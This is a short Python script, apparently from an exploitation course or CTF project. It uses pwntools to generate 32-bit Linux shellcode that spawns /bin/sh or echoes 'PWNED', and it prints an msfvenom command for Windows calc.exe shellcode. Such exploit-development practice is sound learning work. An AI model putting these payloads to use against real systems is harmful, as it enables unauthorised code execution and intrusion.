#!/usr/bin/env python3
"""
Shellcode generator for Project #21.
Uses pwntools's shellcraft to create clean 32-bit shellcode.
"""

from pwn import *
import sys

context.clear(arch='i386', os='linux')

def linux_shell():
    """Linux 32-bit /bin/sh shellcode (null-free)."""
    sc = asm(shellcraft.i386.linux.sh())
    return sc

def linux_execve_calc():
    """Linux 32-bit — just execve('/bin/echo') as a placeholder."""
    sc = asm(shellcraft.i386.linux.execve('/bin/echo', ['echo', 'PWNED'], 0))
    return sc

def windows_calc_placeholder():
    """
    Windows 32-bit calc.exe shellcode.
    Generate REAL shellcode with:
        msfvenom -p windows/exec CMD=calc.exe -f python -b '\\x00\\x0a\\x0d'
    Then paste it here.
    """
    print("[!] Generate Windows shellcode with msfvenom:")
    print("    msfvenom -p windows/exec CMD=calc.exe \\")
    print("      -f python -b '\\x00\\x0a\\x0d' -v sc")
    return b"\x90" * 8  # placeholder

if __name__ == "__main__":
    print("=" * 70)
    print("  SHELLCODE GENERATOR")
    print("=" * 70)

    choice = sys.argv[1] if len(sys.argv) > 1 else 'linux_sh'

    if choice == 'linux_sh':
        sc = linux_shell()
        print(f"[+] Linux /bin/sh shellcode: {len(sc)} bytes")
        print(f"    {sc.hex()}")
        with open("shellcode.bin", "wb") as f:
            f.write(sc)
    elif choice == 'linux_echo':
        sc = linux_execve_calc()
        print(f"[+] Linux echo shellcode: {len(sc)} bytes")
        print(f"    {sc.hex()}")
    elif choice == 'windows':
        sc = windows_calc_placeholder()
        print(f"[+] Windows placeholder: {len(sc)} bytes")
    else:
        print(f"Usage: python shellcode.py [linux_sh|linux_echo|windows]")